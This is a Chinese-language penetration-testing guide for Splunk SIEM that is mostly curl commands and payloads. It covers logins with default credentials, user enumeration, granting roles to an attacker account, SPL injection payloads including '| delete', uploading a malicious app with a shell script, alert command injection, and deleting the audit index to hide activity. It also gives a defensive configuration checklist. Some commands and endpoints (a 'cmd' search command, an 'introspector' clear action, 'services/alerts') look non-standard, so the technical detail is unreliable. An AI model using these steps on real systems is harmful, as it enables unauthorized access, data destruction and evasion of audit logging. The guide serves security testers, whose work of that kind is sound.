# Splunk 安全测试 (Splunk Security Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供 Splunk SIEM 平台的安全测试方法论，帮助测试人员评估 Splunk 基础设施的安全性。

### 1.2 适用范围
本文档适用于以下场景：
- Splunk 实例安全测试
- Splunk 搜索语法注入测试
- Splunk 应用安全评估
- 日志数据完整性验证

### 1.3 读者对象
- 渗透测试工程师
- SIEM 安全分析师
- 系统管理员
- 安全架构师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

Splunk 是广泛使用的 SIEM 和日志分析平台。Splunk 安全测试关注认证授权、搜索语法注入、应用漏洞和数据完整性等问题。

**核心原理：**
- **弱认证配置**：默认凭证、弱密码策略
- **搜索语法注入 (SPL Injection)**：类似 SQL 注入，可篡改搜索逻辑
- **应用漏洞**：Splunk 应用可能存在 RCE、XSS 等漏洞
- **权限配置错误**：角色权限过宽导致未授权访问

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **Splunk Web 界面** | 8000 端口 | 默认凭证、XSS、SSRF |
| **Splunk 管理接口** | 8089 端口 | 未授权访问、RCE |
| **Splunk 应用** | 第三方应用 | 应用漏洞利用 |
| **数据输入** | HTTP Event Collector | 令牌泄露、注入 |
| **告警系统** | 告警脚本 | 命令注入 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**Splunk 服务探测：**
```bash
# 检测 Splunk Web 界面
curl http://target:8000/

# 检测管理接口
curl http://target:8089/services/server/info

# 检查版本信息
curl http://target:8000/en-US/static/version.txt

# 尝试默认凭证
curl -u admin:changeme http://target:8089/services/server/info
curl -u admin:password http://target:8089/services/server/info
```

**SPL 注入探测：**
```bash
# 如果应用接受用户输入进行搜索
# 测试 SPL 注入

# 基础注入测试
' OR 1=1
" OR 1=1
*' OR *='

# 在搜索上下文中测试
# 正常：index=main search_term
# 注入：index=main search_term' OR 1=1 | table _raw
```

**敏感端点探测：**
```bash
# 枚举 Splunk 端点
curl http://target:8000/en-US/manager/
curl http://target:8000/en-US/app/launcher/
curl http://target:8000/en-US/app/search/search

# 检查敏感功能
curl http://target:8000/en-US/manager/launcher/data/inputs
curl http://target:8000/en-US/manager/launcher/apps/local
```

#### 2.3.2 白盒测试

**配置审计：**
```ini
# server.conf 危险配置
[general]
# 危险：弱密码
pass4SymmKey = changeme

[sslConfig]
# 危险：SSL 禁用
enableSplunkWebSSL = false

[httpServer]
# 危险：绑定所有接口
address = 0.0.0.0:8000
```

```ini
# authentication.conf 危险配置
[authentication]
# 危险：使用内置认证无密码策略
authType = Splunk

[passwordPolicy]
# 危险：无密码复杂度要求
min_password_length = 1
```

### 2.4 漏洞利用方法

#### 2.4.1 默认凭证利用

```bash
# 尝试常见默认凭证
# admin:changeme
# admin:password
# admin:admin
# power:user

curl -u admin:changeme \
  http://target:8089/services/authentication/users

# 获取用户列表
curl -u admin:changeme \
  http://target:8089/services/authentication/users?output_mode=json

# 提升权限（如果配置允许）
curl -u admin:changeme -k \
  https://target:8089/services/authentication/users/attacker \
  -d roles=power
```

#### 2.4.2 SPL 注入攻击

```bash
# 假设应用有搜索功能接受用户输入
# 正常搜索：index=main $user_input
# 注入 payload：

# 信息泄露
' | stats count by index | table index

# 数据篡改
' | delete

# 命令执行（如果配置允许）
' | makeresults | cmd "whoami"

# 完整注入示例
curl http://target:8000/en-US/app/search/search \
  -d "search=index=main ' OR 1=1 | table _raw"
```

#### 2.4.3 Splunk 应用漏洞

```bash
# 检查已安装的应用
curl -u admin:changeme \
  http://target:8089/services/apps/local?output_mode=json

# 查找已知漏洞应用
# 参考 CVE 数据库

# 恶意应用上传（如果有权限）
# 创建包含恶意脚本的 Splunk 应用
mkdir malicious_app
mkdir -p malicious_app/bin
echo '#!/bin/bash\nwhoami > /tmp/pwned' > malicious_app/bin/pwned.sh

# 打包并上传
zip -r malicious_app.spl malicious_app/
curl -u admin:changeme -k \
  https://target:8089/services/apps/local \
  -F file=@malicious_app.spl
```

#### 2.4.4 告警脚本注入

```bash
# 如果告警脚本使用用户可控数据
# 创建告警触发恶意命令

# 告警配置示例
curl -u admin:changeme -k \
  https://target:8089/services/alerts \
  -d name=malicious \
  -d search='index=main | cmd "whoami"' \
  -d action.script=malicious_script
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过搜索过滤

```bash
# 如果搜索被限制到特定索引
# 尝试 SPL 注入绕过

# 原始限制：search index=allowed $user_input
# 注入：' OR index=* | table _raw

# 或使用子搜索
' [search index=sensitive | return $_raw]
```

#### 2.5.2 绕过审计日志

```bash
# Splunk 记录审计日志
# 尝试清除或篡改

# 如果有足够权限
curl -u admin:changeme -k \
  https://target:8089/services/admin/introspector \
  -d action=clear

# 或删除审计索引
curl -u admin:changeme -k \
  https://target:8089/services/data/indexes/audit \
  -X DELETE
```

---

## 第三部分：附录

### 3.1 Splunk 安全配置检查清单

| **配置项** | **安全设置** | **风险说明** |
| :--- | :--- | :--- |
| 默认凭证 | 修改 admin:changeme | 未授权访问 |
| 管理接口 | 限制访问 IP | 远程利用 |
| SSL/TLS | 启用加密 | 数据窃听 |
| 角色权限 | 最小权限原则 | 权限滥用 |
| 审计日志 | 启用并保护 | 取证困难 |

### 3.2 Splunk 端口速查表

| **端口** | **用途** | **风险** |
| :--- | :--- | :--- |
| 8000 | Splunk Web | Web 攻击面 |
| 8089 | 管理 API | 远程管理 |
| 9997 | 数据转发 | 数据注入 |
| 8065 | KV Store | 数据泄露 |

### 3.3 参考资源

- [Splunk Security Best Practices](https://docs.splunk.com/Documentation/Splunk/latest/Security)
- [CIS Splunk Benchmark](https://www.cisecurity.org/benchmark/splunk)
- [MITRE ATT&CK - Splunk](https://attack.mitre.org/resources/data-sources/DS0017/)
